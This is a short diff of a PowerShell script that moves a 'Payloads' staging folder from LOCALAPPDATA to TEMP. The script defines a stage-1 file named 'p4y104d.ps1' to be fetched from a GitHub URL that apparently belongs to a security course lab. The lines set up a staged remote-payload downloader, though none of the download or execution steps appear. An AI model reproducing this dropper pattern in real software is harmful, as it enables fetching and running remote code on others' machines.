@@ -1,5 +1,5 @@
 # Define the stage 1 path and file name
-$targetPath = Join-Path -Path $env:LOCALAPPDATA -ChildPath "Payloads"
+$targetPath = Join-Path -Path $env:TEMP -ChildPath "Payloads"
 $stage1File = Join-Path -Path $targetPath -ChildPath "p4y104d.ps1"
 $stage1Url = "https://github.com/kwafula/kwafula.github.io/blob/main/CSC846-Lab08/p4y104d.ps1"
 
